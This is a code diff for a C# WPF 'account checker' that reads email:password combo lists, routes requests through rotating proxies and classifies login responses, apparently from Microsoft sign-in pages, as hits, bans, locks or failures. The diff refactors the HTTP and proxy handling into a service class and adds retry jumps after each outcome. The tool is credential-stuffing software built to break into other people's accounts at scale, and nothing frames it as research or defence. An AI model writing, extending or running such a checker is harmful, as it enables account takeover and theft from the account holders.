@@ -1,14 +1,11 @@
 ﻿using System.Collections.Concurrent;
 using System.IO;
-using System.Net;
-using System.Net.Http;
-using System.Net.Http.Headers;
-using System.Text;
 using Microsoft.Win32;
 using System.Windows;
 using AccountCheckerWPF.Enums;
 using AccountCheckerWPF.Managers;
 using AccountCheckerWPF.Models;
+using AccountCheckerWPF.Services;
 using AccountCheckerWPF.Services.Interface;
 using Newtonsoft.Json.Linq;
 
@@ -16,21 +13,6 @@ namespace AccountCheckerWPF
 {
     public partial class MainWindow : Window
     {
-        public MainWindow()
-        {
-
-        }
-        
-        private readonly IHttpServices _httpServices;
-
-        public MainWindow(IHttpServices httpServices)
-        {
-            InitializeComponent();
-            LoadProxyTypes();
-            
-            _httpServices = httpServices;
-        }
-
         private BlockingCollection<string> _accCh = new BlockingCollection<string>();
         private SemaphoreSlim _semaphore = new SemaphoreSlim(1, 1);
         private int botCount = 1;
@@ -44,6 +26,14 @@ namespace AccountCheckerWPF
         private int _unknown = 0;
         private ProxyManager _proxyManager = new ProxyManager();
         private ComboManager _comboManager = new ComboManager();
+        
+        private IHttpServices _httpServices;
+
+        public MainWindow()
+        {
+            InitializeComponent();
+            LoadProxyTypes();
+        }
 
         private void LoadProxyTypes()
         {
@@ -152,6 +142,7 @@ namespace AccountCheckerWPF
 
         private async Task WorkerFunc()
         {
+            _httpServices = new HttpServices(_proxyManager, _comboManager);
             try
             {
                 await _semaphore.WaitAsync();
@@ -165,18 +156,7 @@ namespace AccountCheckerWPF
                         }
 
                         Retry:
-                        var proxy = _proxyManager.GetRandomProxy();
-                        if (proxy == null)
-                        {
-                            goto Retry;
-                        }
-
-                        var cookieContainer = new CookieContainer();
-                        var httpClientHandler = _proxyManager.GetRandomProxyTransport(out proxy);
-                        httpClientHandler.CookieContainer = cookieContainer;
-
-
-                        // httpClient.Timeout = TimeSpan.FromSeconds(10);
+                        
                         var email = account.Split(':')[0];
                         var password = account.Split(':')[1];
 
@@ -215,14 +195,17 @@ namespace AccountCheckerWPF
                                 bodyPost.Contains("/Abuse?mkt="))
                             {
                                 _fail++;
+                                goto Retry;
                             }
                             else if (bodyPost.Contains(",AC:null,urlFedConvertRename"))
                             {
                                 _ban++;
+                                goto Retry;
                             }
                             else if (bodyPost.Contains("sign in too many times"))
                             {
                                 _retry++;
+                                goto Retry;
                             }
                             else if (cookies.Contains("ANON") ||
                                      cookies.Contains("WLSSC") ||
@@ -238,10 +221,12 @@ namespace AccountCheckerWPF
                                      bodyPost.Contains("Email/Confirm?mkt"))
                             {
                                 _custom++;
+                                goto Retry;
                             }
                             else
                             {
                                 _unknown++;
+                                goto Retry;
                             }
 
                             if (postSuccess)
